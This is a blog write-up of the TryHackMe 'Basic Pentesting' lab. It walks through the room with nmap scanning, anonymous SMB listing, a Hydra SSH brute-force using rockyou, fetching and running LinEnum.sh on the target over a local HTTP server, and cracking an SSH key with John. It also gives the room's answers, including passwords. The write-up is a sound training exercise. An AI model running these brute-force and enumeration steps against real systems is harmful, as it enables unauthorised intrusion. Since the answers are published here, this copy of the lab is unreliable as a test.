---
title: "Challenges: Basic Pentesting (TryHackMe)"
datePublished: Mon Jun 16 2025 20:52:15 GMT+0000 (Coordinated Universal Time)
cuid: cmbzklof8000902jp00r73d0x
slug: challenges-basic-pentesting-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1750107039499/00ee06d8-80d9-4be0-806e-9fb7887780b2.png
tags: nmap, hydra, pentesting, tryhackme, write-up, john-the-ripper, gobuster

---

This article will cover the [Basic Pentesting](https://tryhackme.com/room/basicpentestingjt) write-up on THM Challenges.

Web App Testing and Privilege Escalation

In these set of tasks you'll learn the following:

* brute forcing 
    
* hash cracking 
    
* service enumeration
    
* Linux Enumeration
    

The main goal here is to learn as much as possible. Make sure you are connected to our network using your [OpenVPN configuration file](https://tryhackme.com/access).

Credits to [Josiah Pierce](https://www.vulnhub.com/author/josiah-pierce,569/) from Vulnhub.

## Answer the questions below

1. Deploy the machine and connect to our network
    
2. Find the services exposed by the machine
    
3. What is the name of the hidden directory on the web server(enter name without /)? `development`  
      
    `nmap -sV -p 1-65000 <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750081471175/9b493d68-7924-47af-a309-93895d596b9a.png align="center")
    
4. User brute-forcing to find the username & password
    
5. What is the username? `jan`  
    `smbclient -L \\\\<IP_Address>\\ -N`  
    
    `smbclient -L \\\\10.10.11.217\\Anonymous -N` this launches the smb client
    
    smb: \\&gt; `ls`  
    // we’ll access the staff.txt file
    
    smb: \\&gt; exit
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106214965/f8b2e8e7-a72c-43bb-8712-39603ac93f2f.png align="center")
    
    `cat staff.txt` //We’ll find two users
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106196450/cd4ee182-05a5-47a6-8a78-8dc5bc0235de.png align="center")
    
6. What is the password? `armando`  
      
    There are a lot of Hydra commands, but the one that worked for this case was the one that uses SSH  
      
    `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.143.82`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106345251/bf8425e3-29bb-422f-9e5d-564ea36754de.png align="center")
    
7. What service do you use to access the server(answer in abbreviation in all caps)? `SSH`
    
8. Enumerate the machine to find any vectors for privilege escalation  
      
    On one tab, start the server at port 8000: `python3 -m http.server 8000`  
      
    on another run the following commands:  
      
    `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`  
    
    `wget http://10.10.144.83:8000/LinEnum.sh`  
    
    `chmod +x LinEnum.sh`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1750106849029/e616a8b0-1a0b-4161-bfc4-3d202ac7013a.png align="center")
    
    `./LinEnum.sh`  
    
9. What is the name of the other user you found(al[l](http://10.10.144.83:8000/LinEnum.sh) lowercase)? `kay`
    
10. If you have found another user, what can you do with this information?  
      
    For this last part, you’ll be using John and SSH2John.py to find the id\_rsa and later on the password  
    
11. What is the final password you obtain? `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`  
      
    

Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges.